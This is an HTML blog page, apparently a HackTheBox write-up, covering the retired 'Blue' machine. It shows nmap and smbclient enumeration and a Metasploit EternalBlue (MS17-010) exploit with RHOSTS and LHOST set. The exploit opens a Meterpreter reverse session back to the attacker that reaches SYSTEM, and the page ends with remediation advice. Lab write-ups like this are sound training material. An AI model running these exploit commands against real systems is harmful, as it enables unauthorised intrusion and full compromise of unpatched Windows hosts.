@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>HTB Blue: EternalBlue (MS17-010) from nmap to SYSTEM — Lucky Thandel</title>
+<meta name="description" content="The famous Windows 7 box done properly: SMB recon, confirming MS17-010, exploiting EternalBlue to SYSTEM, and the patching lessons that still matter. By Lucky Thandel.">
+<link rel="stylesheet" href="../../assets/css/style.css">
+</head>
+<body>
+<canvas id="matrix"></canvas>
+<div class="wrap">
+<nav class="nav">
+  <a class="logo" href="../../">lucky@thandel:~<span class="cursor">▊</span></a>
+  <a class="link" href="../../">./home</a>
+  <a class="link active" href="../">./articles</a>
+  <a class="link" href="../../about/">./about</a>
+  <a class="link" href="../../contact/">./contact</a>
+</nav>
+
+<div class="meta">2026-09-29 · retired-machine · by Lucky Thandel</div>
+<h1>HTB Blue: EternalBlue (MS17-010) from nmap to SYSTEM</h1>
+<div><span class="tag">retired-machine</span><span class="tag">easy</span></div>
+
+<div class="article-body">
+<p>Blue is a retired HackTheBox easy Windows machine and the single best teacher of why unpatched SMB is catastrophic. Synopsis: enumerate SMB completely, confirm MS17-010, exploit EternalBlue to SYSTEM. Lab target only — techniques below are for retired boxes and authorized systems.</p>
+<h2><span class="amber">$</span> Box info</h2>
+<p>OS: Windows 7 Professional SP1 (hostname HARIS-PC, workgroup WORKGROUP). Difficulty: easy. Address: 10.10.10.40. Services that matter: MSRPC on 135, NetBIOS on 139, SMB on 445. Skills exercised: SMB enumeration, vulnerability confirmation before exploitation, Metasploit operation, Windows flag hunting from a SYSTEM session.</p>
+<h2><span class="amber">$</span> Skills required</h2>
+<p>Nmap service and script scanning, SMB share enumeration with smbclient, Metasploit module configuration (RHOSTS/LHOST discipline), Meterpreter basics.</p>
+<h2><span class="amber">$</span> Enumeration — Nmap</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># nmap: services plus SMB vuln check</span>
+nmap -sC -sV -oN blue.nmap 10.10.10.40
+nmap --script smb-vuln-ms17-010 -p 445 10.10.10.40 -oN blue.ms17-010</pre>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># nmap: old Windows with SMB open</span>
+PORT    STATE SERVICE      VERSION
+135/tcp open  msrpc        Microsoft Windows RPC
+139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+Service Info: Host: HARIS-PC; OS: Windows</pre>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># smb-vuln-ms17-010: confirmed vulnerable</span>
+Host script results:
+| smb-vuln-ms17-010:
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143</pre>
+<p>Ports 135 (RPC), 139 (NetBIOS) and 445 (SMB) on Windows 7 Professional SP1 — and the vuln script confirms the host is VULNERABLE to remote code execution in SMBv1 (MS17-010, CVE-2017-0143). A confirmed CVE, not a hunch: this is the green light for the EternalBlue path.</p>
+<h2><span class="amber">$</span> Enumeration — SMB shares</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: list shares and users</span>
+smbclient -L //10.10.10.40
+nxc smb 10.10.10.40 --shares</pre>
+<p>Nothing to log into — shares are empty or inaccessible — which tells you the intended path is the SMB service itself, not credentials.</p>
+<h2><span class="amber">$</span> Exploitation — EternalBlue</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># msfconsole: ms17_010_eternalblue</span>
+msfconsole -q
+msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue
+msf6 exploit(ms17_010_eternalblue) &gt; set RHOSTS 10.10.10.40
+msf6 exploit(ms17_010_eternalblue) &gt; set LHOST 10.10.14.23
+msf6 exploit(ms17_010_eternalblue) &gt; run
+[*] Meterpreter session 1 opened (10.10.14.23:4444 -&gt; 10.10.10.40:49158)</pre>
+<p>The module negotiates the SMBv1 transaction overflow and returns a session as NT AUTHORITY\SYSTEM on the first try when the target is genuinely unpatched.</p>
+<h2><span class="amber">$</span> Flags</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># meterpreter: confirm SYSTEM, locate both flags</span>
+meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter &gt; sysinfo
+Computer        : HARIS-PC
+OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
+meterpreter &gt; search -f user.txt
+meterpreter &gt; search -f root.txt</pre>
+<p>user.txt sits on a standard user desktop while root.txt needs SYSTEM — both fall in the single SYSTEM session. Flag values redacted per HTB rules; earn them in your own lab.</p>
+<h2><span class="amber">$</span> Why this works</h2>
+<p>MS17-010 is a buffer overflow in how SMBv1 handles crafted Trans2 requests. The exploit corrupts kernel pool memory to gain arbitrary code execution at the highest privilege level — one vulnerability equals total compromise, no privilege escalation step needed.</p>
+<h2><span class="amber">$</span> Dead ends</h2>
+<p>Trying SMB brute-force first (wasted twenty minutes — always run the vuln script before password guessing), and forgetting to set LHOST after switching VPN servers (the classic silent failure — session never calls home).</p>
+<h2><span class="amber">$</span> Remediation notes</h2>
+<p>Disable SMBv1 everywhere, apply the MS17-010 patch, block port 445 at the perimeter, and alert on any SMBv1 negotiation still happening on the network. WannaCry wormed the planet through exactly this hole in 2017. Written by Lucky Thandel.</p>
+</div>
+
+<div class="byline">Written by <strong>Lucky Thandel</strong> · HTB walkthrough series · retired machines only — no spoilers for active boxes.</div>
+<p><a class="btn" href="../">← $ cd ../articles</a></p>
+
+<footer>
+  <span>© 2026 Lucky Thandel · written by Lucky Thandel</span>
+  <span>session <span id="session-clock">00:00:00</span> · <a href="../../contact/">contact</a></span>
+</footer>
+</div>
+<script src="../../assets/js/terminal.js"></script>
+</body>
+</html>
